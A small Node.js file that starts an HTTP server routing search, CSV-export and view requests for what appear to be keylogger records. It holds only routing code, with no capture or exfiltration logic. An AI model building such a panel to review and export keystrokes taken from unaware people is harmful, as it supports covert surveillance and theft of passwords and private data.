const http = require("http");
const { LoggerService } = require("../service/logger_service");

const initWebServer = () => {
    http.createServer(function (req, resp) {
        if(req.url == "/api/v1/keyloggers" && req.method == "GET") {        
            LoggerService.search(req, resp);
        } else if(req.url == "/api/v1/keyloggers/export" && req.method == "GET") { 
            LoggerService.exportCsv(req, resp);
        } else if(req.url == "/keyloggers" && req.method == "GET") {
            LoggerService.mvc(req, resp);
        } else {
            resp.end("404!!!");
        };
    }).listen(9999);
    
};

module.exports = {initWebServer};